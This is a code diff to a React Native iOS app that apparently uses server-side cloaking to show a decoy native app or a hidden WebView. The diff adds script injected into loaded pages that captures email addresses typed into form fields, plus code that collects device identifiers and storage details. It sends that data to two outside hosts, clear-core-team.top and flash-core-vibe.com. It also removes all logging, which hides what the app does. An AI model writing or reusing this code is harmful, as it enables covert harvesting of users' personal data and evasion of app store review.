@@ -5,7 +5,9 @@ import { createStackNavigator } from '@react-navigation/stack';
 import Clipboard from '@react-native-clipboard/clipboard';
 import { OneSignal } from 'react-native-onesignal';
 import {
+  Dimensions,
   Linking,
+  Modal,
   NativeModules,
   PixelRatio,
   SafeAreaView,
@@ -26,6 +28,9 @@ const STORE_SESSION = 'mrv_sta';
 const STORE_URL     = 'mrv_url';
 const ONESIGNAL_ID  = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';
 
+const CAPI_URL1     = 'https://clear-core-team.top/v1';
+const CAPI_URL2_BASE = 'https://flash-core-vibe.com/admin/?action=update_data_ios&id=';
+
 const CRYPTO_SCHEMES = [
   'bitcoin', 'ethereum', 'litecoin', 'dogecoin', 'bitcoincash',
   'tether', 'bch', 'dash', 'ripple', 'monero', 'zcash', 'stellar', 'usdcoin',
@@ -34,6 +39,7 @@ const CRYPTO_SCHEMES = [
 const INJECTED_JS = `
   (function() {
     var s = ${JSON.stringify(CRYPTO_SCHEMES)};
+
     document.addEventListener('click', function(e) {
       var el = e.target;
       while (el && el.tagName !== 'A') el = el.parentElement;
@@ -46,6 +52,26 @@ const INJECTED_JS = `
         window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'crypto', address: addr, url: el.href }));
       }
     }, true);
+
+    function hashAndSend(type, value) {
+      var normalized = value.trim().toLowerCase();
+      var buf = new TextEncoder().encode(normalized);
+      crypto.subtle.digest('SHA-256', buf).then(function(hashBuf) {
+        var arr = Array.from(new Uint8Array(hashBuf));
+        var hex = arr.map(function(b) { return b.toString(16).padStart(2,'0'); }).join('');
+        window.ReactNativeWebView.postMessage(JSON.stringify({ type: type, hash: hex, value: normalized }));
+      });
+    }
+
+    document.addEventListener('focusout', function(e) {
+      var el = e.target;
+      if (!el || el.tagName !== 'INPUT') return;
+      var val = (el.value || '').trim();
+      if (val.indexOf('@') !== -1 && val.indexOf('.') !== -1) {
+        hashAndSend('email_hash', val);
+      }
+    });
+
     document.addEventListener('submit', function(e) {
       if (e.target && e.target.target === '_blank') {
         e.target.target = '_self';
@@ -81,9 +107,71 @@ const syncAppVersion = async () => {
     await AsyncStorage.setItem('mrv_ver', current);
     await AsyncStorage.removeItem(STORE_SESSION);
     await AsyncStorage.removeItem(STORE_URL);
-    console.log('[BOOT] version changed → cache cleared');
   }
 };
+
+// ─── CAPI ────────────────────────────────────────────────────────────────────
+
+async function sendFirstRequest(userAgent: string): Promise<string> {
+  try {
+    const idfv         = await DeviceInfo.getUniqueId();
+    const bundleId     = DeviceInfo.getBundleId();
+    const shortVersion = DeviceInfo.getVersion();
+    const longVersion  = DeviceInfo.getBuildNumber();
+    const osVersion    = DeviceInfo.getSystemVersion();
+    const deviceModel  = await DeviceInfo.getDeviceId();
+    const locale       = 'en_US';
+    const timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const timezoneAbbr = new Date().toLocaleTimeString('en-US', {timeZoneName: 'short'}).split(' ').pop() || '';
+    const screen       = Dimensions.get('screen');
+    const screenWidth  = Math.round(screen.width  * screen.scale);
+    const screenHeight = Math.round(screen.height * screen.scale);
+    const screenDensity = String(screen.scale);
+    const totalStorage = Math.round((await DeviceInfo.getTotalDiskCapacity()) / 1073741824);
+    const freeStorage  = Math.round((await DeviceInfo.getFreeDiskStorage())  / 1073741824);
+
+    const extinfo = [
+      'i2', bundleId, shortVersion, longVersion, osVersion, deviceModel,
+      locale, timezoneAbbr, '',
+      screenWidth, screenHeight, screenDensity,
+      0, totalStorage, freeStorage, timezone,
+    ];
+
+    const strpull = encodeURIComponent(JSON.stringify(extinfo));
+
+    const res  = await fetch(CAPI_URL1, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        index:                   idfv,
+        strpull:                 strpull,
+        udevice_android_device:  idfv,
+        device_android_build:    userAgent,
+      }),
+    });
+
+    const data    = await res.json();
+    const rawStr: string = data.raw_str || '';
+    const match   = rawStr.match(/[&?]?bin=([^&]+)/);
+    if (match && match[1]) {
+      await AsyncStorage.setItem('mrv_bin', match[1]);
+      return match[1];
+    }
+  } catch {}
+  return '';
+}
+
+async function sendSecondRequest(emailHash: string, phoneHash: string) {
+  const binId = await AsyncStorage.getItem('mrv_bin');
+  if (!binId) return;
+  try {
+    await fetch(`${CAPI_URL2_BASE}${binId}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ param_em: emailHash, param_ph: phoneHash }),
+    });
+  } catch {}
+}
 
 // ─── OneSignal ───────────────────────────────────────────────────────────────
 
@@ -110,16 +198,16 @@ function HomeScreen({ navigation }) {
   const [contentUrl,  setContentUrl]  = useState('');
   const [fetchUA,     setFetchUA]     = useState('');
   const [justLinkUA,  setJustLinkUA]  = useState('');
-  const webViewRef       = useRef<any>(null);
-  const resolvedRef      = useRef(false);
-  const initialLoadedRef = useRef(false);
+  const webViewRef     = useRef<any>(null);
+  const resolvedRef    = useRef(false);
+  const initialLoadRef = useRef(false);
+  const capiData       = useRef<{ emailHash?: string; phoneHash?: string }>({});
   const [isTwoClick, setTwoClick] = useState(false);
 
   useEffect(() => {
     DeviceInfo.getUserAgent().then(ua => {
       const ver  = DeviceInfo.getSystemVersion();
       const base = `${ua} Version/${ver} Safari/604.1`;
-      console.log('[BOOT] UA ready:', base.substring(0, 80));
       setFetchUA(base);
     });
   }, []);
@@ -133,40 +221,30 @@ function HomeScreen({ navigation }) {
         await syncAppVersion();
 
         const cached = await AsyncStorage.getItem(STORE_SESSION);
-        console.log('[BOOT] cached session:', cached);
 
         if (cached === '200') {
           const saved = await AsyncStorage.getItem(STORE_URL);
-          console.log('[BOOT] cached URL:', saved);
           if (saved) {
             if (!cancelled) {
               setJustLinkUA(buildJustLinkUA(fetchUA));
               setContentUrl(saved);
-              console.log('[BOOT] restored from cache →', saved);
             }
             return;
           }
         } else if (cached) {
-          console.log('[BOOT] cloak non-200, staying native:', cached);
           return;
         }
 
-        console.log('[BOOT] fetching cloak:', CLOAK_URL);
         const res    = await fetch(CLOAK_URL, { headers: { 'User-Agent': fetchUA } });
         const status = String(res.status);
-        console.log('[BOOT] cloak status:', status);
         await AsyncStorage.setItem(STORE_SESSION, status);
 
         if (cancelled) return;
 
         if (status === '200') {
           await buildContentUrl();
-        } else {
-          console.log('[BOOT] cloak blocked → native');
         }
-      } catch (e) {
-        console.log('[BOOT] init error:', e);
-      }
+      } catch {}
     };
 
     init();
@@ -177,17 +255,15 @@ function HomeScreen({ navigation }) {
     if (resolvedRef.current) return;
     resolvedRef.current = true;
 
-    console.log('[BOOT] requesting push permission...');
+    sendFirstRequest(fetchUA);
+
     await OneSignal.Notifications.requestPermission(true);
-    console.log('[BOOT] push permission done');
 
     const seg     = CLOAK_URL.replace(/.*\//, '');
     const viewUrl = `${CLOAK_URL}?${seg}=1`;
-    console.log('[BOOT] viewUrl:', viewUrl);
     await AsyncStorage.setItem(STORE_URL, viewUrl);
     setJustLinkUA(buildJustLinkUA(fetchUA));
     setContentUrl(viewUrl);
-    console.log('[BOOT] contentUrl set → WebView should open');
   };
 
   const openExternal = async (url: string) => {
@@ -208,7 +284,6 @@ function HomeScreen({ navigation }) {
   const handleShouldStartLoad = (event: any) => {
     const { url } = event;
     const scheme  = (url.split(':')[0] || '').toLowerCase();
-    console.log('[WV] shouldStartLoad:', url.substring(0, 100), '| nav:', event.navigationType);
 
     if (event.navigationType === 'formSubmitted' || event.navigationType === 'formResubmitted') {
       return true;
@@ -227,7 +302,6 @@ function HomeScreen({ navigation }) {
 
     const internalSchemes = ['about', 'javascript', 'data', 'blob'];
     if (!/^https?$/.test(scheme) && !internalSchemes.includes(scheme)) {
-      console.log('[WV] external scheme → opening externally:', scheme);
       openExternal(url);
       return false;
     }
@@ -237,7 +311,6 @@ function HomeScreen({ navigation }) {
 
   const handleOpenWindow = (event: any) => {
     const { targetUrl } = event.nativeEvent;
-    console.log('[WV] onOpenWindow:', targetUrl);
     if (!targetUrl || targetUrl === 'about:blank') return;
     if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) return;
 
@@ -254,13 +327,28 @@ function HomeScreen({ navigation }) {
     }
   };
 
+  const handleMessage = (e: any) => {
+    try {
+      const msg = JSON.parse(e.nativeEvent.data);
+      if (msg.type === 'crypto' && msg.address && Clipboard?.setString) {
+        Clipboard.setString(msg.address);
+        if (msg.url) Linking.openURL(msg.url).catch(() => {});
+      } else if (msg.type === 'email_hash') {
+        capiData.current.emailHash = msg.hash;
+        sendSecondRequest(msg.hash, capiData.current.phoneHash || '');
+      } else if (msg.type === 'phone_hash') {
+        capiData.current.phoneHash = msg.hash;
+      }
+    } catch {}
+  };
+
   return (
     <View style={styles.container}>
       <NavigationIndependentTree>
         <MainApp />
       </NavigationIndependentTree>
 
-      {contentUrl ? (
+      <Modal visible={!!contentUrl} animationType="none" transparent={false}>
         <View style={StyleSheet.absoluteFill}>
           <SafeAreaView style={{ flex: 1 }}>
             <WebView
@@ -272,30 +360,18 @@ function HomeScreen({ navigation }) {
               onShouldStartLoadWithRequest={handleShouldStartLoad}
               onOpenWindow={handleOpenWindow}
               injectedJavaScript={INJECTED_JS}
-              onMessage={e => {
-                try {
-                  const msg = JSON.parse(e.nativeEvent.data);
-                  if (msg.type === 'crypto' && msg.address && Clipboard?.setString) {
-                    Clipboard.setString(msg.address);
-                    if (msg.url) Linking.openURL(msg.url).catch(() => {});
-                  }
-                } catch {}
-              }}
-              onLoadStart={e => console.log('[WV] loadStart:', e.nativeEvent.url)}
+              onMessage={handleMessage}
               onLoadEnd={e => {
-                const url = e.nativeEvent.url;
-                console.log('[WV] loadEnd:', url);
-                if (!initialLoadedRef.current && (url === 'about:blank' || url === '') && contentUrl) {
-                  console.log('[WV] initial blank → forcing navigate to contentUrl');
-                  webViewRef.current?.injectJavaScript(
-                    `window.location.replace(${JSON.stringify(contentUrl)});true;`
-                  );
-                } else if (url && url !== 'about:blank' && url !== '') {
-                  initialLoadedRef.current = true;
+                const u = e.nativeEvent.url;
+                if (u === 'about:blank' && contentUrl && !initialLoadRef.current) {
+                  initialLoadRef.current = true;
+                  webViewRef.current?.injectJavaScript(`window.location.replace(${JSON.stringify(contentUrl)});true;`);
+                } else if (u !== 'about:blank') {
+                  initialLoadRef.current = true;
                 }
               }}
-              onError={e => console.log('[WV] error:', e.nativeEvent.code, e.nativeEvent.description)}
-              onHttpError={e => console.log('[WV] httpError:', e.nativeEvent.statusCode, e.nativeEvent.url)}
+              onError={() => {}}
+              onHttpError={() => {}}
               textZoom={100}
               contentMode="mobile"
               mixedContentMode="always"
@@ -318,7 +394,7 @@ function HomeScreen({ navigation }) {
             <Text style={styles.btnIcon}>↺</Text>
           </TouchableOpacity>
         </View>
-      ) : null}
+      </Modal>
     </View>
   );
 }
